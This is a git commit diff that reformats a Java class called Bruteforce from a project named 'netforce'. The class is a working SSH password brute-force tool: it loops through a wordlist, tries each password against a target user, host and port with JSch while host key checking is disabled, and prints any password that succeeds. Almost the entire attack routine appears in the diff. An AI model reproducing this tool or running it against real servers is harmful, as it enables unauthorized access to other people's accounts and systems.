216b470af581583decf79c490a6c5a3547e194be
ThatcherDev <thatcher.clough@gmail.com>
2019-08-24 20:03:22 -0400

    Formated code

--- src/main/java/com/github/thatcherdev/netforce/Bruteforce.java
+++ src/main/java/com/github/thatcherdev/netforce/Bruteforce.java
@@ -12,7 +12,7 @@ public class Bruteforce {
 	 * Start a brute force attack on an SSH server with user {@link user} at host
 	 * {@link host} with port {@link port} and timeout {@link timeout} using
 	 * wordlist {@link file}.
-	 * 
+	 *
 	 * @param host    host of SSH server to brute force
 	 * @param port    port of SSH server
 	 * @param user    user to brute force
@@ -20,30 +20,31 @@ public class Bruteforce {
 	 * @param timeout timeout for connecting to SSH server
 	 */
 	public static void start(String host, int port, String user, String file, int timeout) {
-		Scanner in=null;
-		try{
-			System.out.println("Brute forcing "+user+"@"+host+":"+port+"\n");
-			in=new Scanner(new File(file));
-			while(in.hasNextLine()){
-				String password=in.nextLine();
-				System.out.print("\033[2K\033[56DTrying password '"+password+"'");
-				try{
+		Scanner in = null;
+		try {
+			System.out.println("Brute forcing " + user + "@" + host + ":" + port + "\n");
+			in = new Scanner(new File(file));
+			while (in.hasNextLine()) {
+				String password = in.nextLine();
+				System.out.print("\033[2K\033[56DTrying password '" + password + "'");
+				try {
 					check(host, port, user, password, timeout);
-					System.out.println("\033[2K\033[56DPassword for "+user+"@"+host+":"+port+" is '"+password+"'");
+					System.out.println(
+							"\033[2K\033[56DPassword for " + user + "@" + host + ":" + port + " is '" + password + "'");
 					return;
-				}catch(Exception e){
-					if(e.getMessage().equals("Auth fail"))
+				} catch (Exception e) {
+					if (e.getMessage().equals("Auth fail"))
 						continue;
 					else
 						throw new Exception();
 				}
 			}
-			System.out.println("\033[2K\033[56DCould not get password for "+user+"@"+host+":"+port);
-		}catch(Exception e){
+			System.out.println("\033[2K\033[56DCould not get password for " + user + "@" + host + ":" + port);
+		} catch (Exception e) {
 			System.out.print("\033[2K\033[56D");
 			e.printStackTrace();
-		}finally{
-			if(in!=null)
+		} finally {
+			if (in != null)
 				in.close();
 		}
 	}
@@ -52,7 +53,7 @@ public class Bruteforce {
 	 * Attempt to connect to an SSH server with user {@link user} at host
 	 * {@link host} with port {@link port}, password {@link password}, and timeout
 	 * {@link timeout}.
-	 * 
+	 *
 	 * @param host     host of SSH server
 	 * @param port     port of SSH server
 	 * @param user     user to login to
@@ -62,8 +63,8 @@ public class Bruteforce {
 	 * @throws JSchException
 	 */
 	private static void check(String host, int port, String user, String password, int timeout) throws JSchException {
-		JSch jsch=new JSch();
-		Session session=jsch.getSession(user, host, port);
+		JSch jsch = new JSch();
+		Session session = jsch.getSession(user, host, port);
 		session.setConfig("StrictHostKeyChecking", "no");
 		session.setTimeout(timeout);
 		session.setPassword(password);
